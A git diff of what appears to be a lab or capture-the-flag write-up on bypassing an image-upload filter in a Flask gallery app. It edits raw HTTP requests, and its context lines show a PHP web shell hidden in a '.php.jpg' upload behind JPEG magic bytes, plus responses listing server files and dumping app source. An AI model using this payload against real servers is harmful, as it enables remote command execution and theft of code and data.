@@ -15,29 +15,9 @@ Uploading an image the apps adds random string of characters in front of the ori
 
 Using the upload form to upload a image gives the redirects the user to the gallery page.  
 ![](../img/TPG_Upload.png)
-```http
-POST /upload HTTP/1.1
-Host: 134.122.88.8:5005
-Content-Length: 31291
-Cache-Control: max-age=0
-Accept-Language: en-GB,en;q=0.9
-Origin: http://134.122.88.8:5005
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGAAHlBuhSrUytxWA
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://134.122.88.8:5005/upload
-Accept-Encoding: gzip, deflate, br
-Connection: keep-alive
 
-------WebKitFormBoundaryGAAHlBuhSrUytxWA
-Content-Disposition: form-data; name="image"; filename="georgie_pose.jpg"
-Content-Type: image/jpeg
-
-
-
-[...]
-```
+Image is needed here, because the markdown breaks when uploading to Github. But further request and responses the magic bytes are replaced with ```[magic bytes here]``` 
+![](TPG_jpgdata.png)
 
 
 So to find the upload images the user need to browse the gallery or enter the ```/uploads``` endpoint to find the last uploaded image.  
@@ -87,7 +67,7 @@ Connection: keep-alive
 Content-Disposition: form-data; name="image"; filename="test_shell_data.php.jpg"
 Content-Type: image/jpeg
 
-
+[magic bytes here]
 
 <?php echo system($_GET['command']); ?>
 ------WebKitFormBoundaryJfHPOnzvhptO9nuH--
@@ -124,6 +104,8 @@ Connection: Keep-Alive
 Content-Type: text/html; charset=UTF-8
 Content-Length: 122
 
+[magic bytes here]
+
 Dockerfile
 app.py
 backup.bak
@@ -147,6 +129,8 @@ Keep-Alive: timeout=5, max=100
 Connection: Keep-Alive
 Content-Type: text/html; charset=UTF-8
 Content-Length: 4245
+
+[magic bytes here]
 
 from flask import Flask, render_template, request, redirect, url_for, flash, send_from_directory, session
 import os
